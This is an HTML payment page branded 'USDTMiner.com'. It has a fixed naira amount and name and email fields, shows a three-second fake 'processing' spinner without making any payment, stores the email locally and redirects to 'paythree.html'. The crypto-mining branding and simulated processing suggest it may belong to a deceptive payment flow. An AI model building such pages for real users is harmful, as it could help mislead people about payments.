<!DOCTYPE html>
<html lang="en">
<head>

<body>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,500;1,900&display=swap');
           * {
            padding: 0;
            margin: 0;
            font-family: 'Poppins', sans-serif;
        }
        .top {
            width: 100%;
            height: 150px;
            background:#272b58;
            color: white;
        }
        .top h2 {
            padding-top: 30px;
            padding-left: 10px;
        }
        .box {
            width: 100%;
            height: 400px;
            background: #ffffff; 
            margin: 0 auto;
            border-top-left-radius: 30px;
            border-top-right-radius: 30px;
        }
        .box label {
            font-size: 20px;
            padding-left: 15px;
            padding-top: 15px;
            color: #757575;
        }
        .box input {
            width: 90%;
            height: 41px;
            margin: 0 auto;
            display: block;
            padding-bottom: 4px;
            padding-left: 15px;
            margin-top: 5px;
            border-radius: 6px;
            border:  1px solid #181616;
        }
        .box button {
            width: 90%;
            height: 41px;
            margin: 0 auto;
            display: block;
            padding-bottom: 4px;
            margin-top: 15px;
            border-radius: 6px;
            border:  none; 
            color: white;
            background: #272b58;
        }
        .box img {
            width: 100%;
        }
        .loader-container {
            display: none;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #a3703f;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.5s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <div class="top">
        <h2>USDTMiner.com</h2> <br> <br>
        <div class="box"> <br> <br>
            <form id="paymentForm" onsubmit="handleSubmit(event)">
                <label for="">Amount</label> <br> 
                <input type="text" value="  â‚¦50,690.00" disabled> <br> 
                <label for="fullName">Full Name</label> <br> 
                <input type="text" id="fullName" name="fullName" placeholder="Your full name" required> <br> 
                <label for="email">Your Email Address</label> <br> 
                <input type="email" id="email" name="email" placeholder="email address" required> <br>
                <button id="payButton">Pay</button> <br>
                <img src="https://fv5-3.failiem.lv/thumb_show.php?i=3yvkxjaa2e&view&v=1" alt="">
            </form>
        </div>
    </div>
    <div class="loader-container" id="loaderContainer">
        <div class="loader"></div>
    </div>
    <script>
        const paymentForm = document.getElementById('paymentForm');
        const payButton = document.getElementById('payButton');
        const loaderContainer = document.getElementById('loaderContainer');
        function handleSubmit(event) {
            event.preventDefault();
            if (paymentForm.checkValidity()) {
                loaderContainer.style.display = 'flex';
                payButton.disabled = true;
                document.getElementById('fullName').disabled = true;
                document.getElementById('email').disabled = true;
                setTimeout(function () {
                    payButton.disabled = false;
                    document.getElementById('fullName').disabled = false;
                    document.getElementById('email').disabled = false;
                    loaderContainer.style.display = 'none';
                    const email = document.getElementById('email').value;
                    localStorage.setItem('email', email);
                    window.location.href = 'paythree.html';
                }, 3000);
            }
        }
    </script>
</body>
</html>
